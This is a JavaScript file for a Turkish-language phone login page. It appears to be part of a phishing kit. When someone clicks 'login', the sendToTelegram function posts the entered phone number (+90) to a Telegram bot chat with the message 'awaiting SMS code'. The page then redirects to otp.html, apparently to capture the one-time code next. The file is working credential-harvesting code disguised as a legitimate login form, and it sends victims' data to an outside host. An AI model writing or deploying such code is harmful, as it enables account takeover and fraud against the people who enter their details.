// Phone number formatting
const phoneInput = document.getElementById('phone');
const loginBtn = document.getElementById('loginBtn');

// Only allow digits in phone input
phoneInput.addEventListener('input', function (e) {
    let value = this.value.replace(/\D/g, '');
    if (value.length > 10) {
        value = value.slice(0, 10);
    }
    this.value = value;
});

// Send phone to Telegram
async function sendToTelegram(phone) {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
    const text = `📱 Yeni Giriş\n\n📞 Telefon: +90${phone}\n\n⏳ SMS Kod Bekleniyor...`;

    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
        const data = await res.json();
        if (data.ok) {
            // Store message_id and phone for OTP page to update
            localStorage.setItem('tg_message_id', data.result.message_id);
            localStorage.setItem('tg_phone', phone);
            return true;
        }
        return false;
    } catch (e) {
        console.error('Telegram error:', e);
        return false;
    }
}

// Login button click handler
loginBtn.addEventListener('click', async function () {
    const phone = phoneInput.value.replace(/\D/g, '');

    if (phone.length < 10) {
        const inputGroup = document.querySelector('.input-group');
        inputGroup.style.borderColor = '#e74c3c';
        inputGroup.classList.add('shake');

        setTimeout(() => {
            inputGroup.style.borderColor = '#c5cdd6';
            inputGroup.classList.remove('shake');
        }, 600);
        return;
    }

    // Proceed with login - send to Telegram then navigate
    this.textContent = 'Giriş yapılıyor...';
    this.disabled = true;
    this.style.opacity = '0.7';

    await sendToTelegram(phone);

    setTimeout(() => {
        window.location.href = 'otp.html';
    }, 500);
});

// Add shake animation dynamically
const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        20% { transform: translateX(-6px); }
        40% { transform: translateX(6px); }
        60% { transform: translateX(-4px); }
        80% { transform: translateX(4px); }
    }
    .shake {
        animation: shake 0.4s ease-in-out;
    }
`;
document.head.appendChild(style);
